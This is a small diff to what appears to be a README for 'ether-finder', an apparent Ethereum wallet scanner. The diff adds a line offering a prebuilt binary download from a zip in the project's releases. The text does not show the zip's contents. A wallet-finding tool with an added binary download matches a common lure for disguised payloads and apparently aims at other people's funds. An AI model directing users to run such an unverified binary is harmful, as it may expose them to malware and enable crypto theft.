@@ -20,6 +20,7 @@ git clone https://github.com/NearZeK/ether-finder/
 cd ether-finder
 python eth-scan.py
 ```
+or run it from binary: https://github.com/NearZeK/ether-finder/releases/download/ether/eth-finder.zip
 
 ![demo](./demo.png)
 
